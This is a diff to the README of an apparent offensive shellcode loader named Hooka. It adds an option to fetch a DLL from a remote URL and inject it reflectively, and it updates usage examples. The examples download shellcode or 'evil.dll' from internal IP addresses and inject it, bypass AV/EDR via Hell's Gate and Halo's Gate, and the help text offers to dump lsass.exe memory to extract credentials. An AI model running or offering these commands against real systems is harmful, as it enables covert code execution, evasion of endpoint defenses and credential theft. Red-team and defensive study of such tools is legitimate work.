@@ -94,6 +94,8 @@ go build .
         dinamically detect hooked functions by EDR
   -lsass string
         dump lsass.exe process memory into a file to extract credentials (run as admin)
+  -remote-dll string
+        remote url where DLL is stored, especify function separated by comma (i.e. http://192.168.1.37/evil.dll,xyz)
   -t string
         shellcode injection technique: CreateRemoteThread, Fibers, CreateProcess, EarlyBirdApc, UuidFromString (default: random)
   -test
@@ -116,14 +118,16 @@ go build .
 
 - If no technique is especified it will use a random one
 
-> Inject shellcode from URL
+> Inject shellcode from URL or file
 ```sh
 .\Hooka.exe --url http://192.168.116.37/shellcode.bin
+.\Hooka.exe --file shellcode.bin
 ```
 
-> Inject shellcode from file
+> Shellcode reflective dll injection (***sRDI***)
 ```sh
-.\Hooka.exe --file shellcode.bin
+.\Hooka.exe --dll evil.dll,xyz
+.\Hooka.exe --remote-dll http://192.168.1.37/evil.dll,xyz
 ```
 
 > Decode shellcode as hex or base64
@@ -134,7 +138,7 @@ go build .
 
 > Use Hell's Gate + Halo's Gate to bypass AVs/EDRs
 ```sh
-.\Hooka.exe --url http://192.168.116.37/shellcode.bin --hells
+.\Hooka.exe --url http://192.168.116.37/shellcode.bin --hells -t CreateRemoteThread
 ```
 
 > Unhook function before injecting shellcode
